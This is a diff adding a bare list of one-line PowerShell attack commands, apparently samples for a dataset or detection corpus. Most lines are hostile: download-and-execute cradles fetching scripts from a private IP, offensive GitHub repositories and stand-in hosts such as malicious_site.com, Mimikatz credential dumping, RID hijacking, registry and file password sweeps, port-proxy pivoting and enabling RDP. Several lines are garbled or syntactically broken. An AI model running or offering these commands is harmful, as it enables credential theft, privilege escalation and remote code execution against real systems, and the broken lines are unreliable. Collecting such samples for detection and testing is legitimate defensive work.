@@ -1,0 +1,35 @@
+Invoke-CredentialPhishing -UseHost -Credential dcorp-mssql -Command 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')"
+Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')}
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-Mimikatz
+Get-CimInstance -ClassName win32_operatingsystem | Out-File -FilePath C:\results.csv -NoTypeInformation
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')"
+Invoke-RIDHijacking -User unina -RID 500
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Mimikatz"
+Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/WINspect.ps1')"
+Get-BrowserInformation -Browser All -Datatype History -UserName Alice -Search 'twitter'
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')"
+Get-CimInstance -class Win32_Group
+Get-Date -Format %Y-%m-%d %H:%M:%S
+$payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz -DumpCreds")
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Mimikatz"
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/credential.ps1')"
+Get-CimInstance -class Win32_UserAccount
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1 -OutFile hello.ps1; .\hello.ps1"
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name T1112 -Value "<script>"
+Get-ChildItem -Path .\current
+gp "HKCU:\Software\Policies\Microsoft\Windows\CurrentVersion\Winlogon\" 'Password' 'Password1' 'Password2' 'Password3' 'Password4' 'Password5' 'Password6' 'Password7' 'Password8';
+Get-PassHashes -LocalFilePath 'C:\windows\psdrt\psdrt.dit'
+Get-GPO -OU 1.2.840.113556.1.4.803:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /gpo:d7e2b80507ea0ef9c5fa3a93fe4918910691647d80 
+netsh interface portproxy add v4tov4 listenport=5446 connectport=5985 connectaddress=10.35.8.23
+gci C:\Users\unina\Desktop -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password'
+gci C:\Users\unina\Desktop -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue | Select-String -Pattern 'ip_hostname.txt'
+$share = New-SmbShare -Name "sharedir" -Force; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://anyone.com/sharedir.ps1')
+$stream = Get-Stream -Name 'evadump' ; Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class EventStream { [DllImport('evadump.dll')] public static extern bool OpenStream(IntPtr hWndNewOwner); [DllImport('evadump.dll')] public static extern bool CloseStream(); [DllImport('evadump.dll')] public static extern IntPtr GetData(uint uFormat); [DllImport('evadump.dll')] public static extern IntPtr GlobalLock(IntPtr hMem); [DllImport('evadump.dll')] public static extern bool GlobalUnlock(IntPtr hMem); [DllImport('evadump.dll')] public static extern int GlobalSize(IntPtr hMem); } "@; $stream.OpenStream([IntPtr]::Zero) $stream.CloseStream()
+gwmi -class Win32_User -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select S-1-5-21-3263068140-2042698922-2891547269-1126
+$path = 'C:\windows\psdrt\psdrt.dit'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($path); $sendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); $encodedSendback = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); $encodedSendback
+Get-ForestGlobalCatalog -Forest local.domain ; Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"
+$code = "IEX (New-Object Net.WebClient).DownloadString('https://malicious_site.com/malicious_code.ps1')"; Invoke-Expression $code
+(Get-CimInstance -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
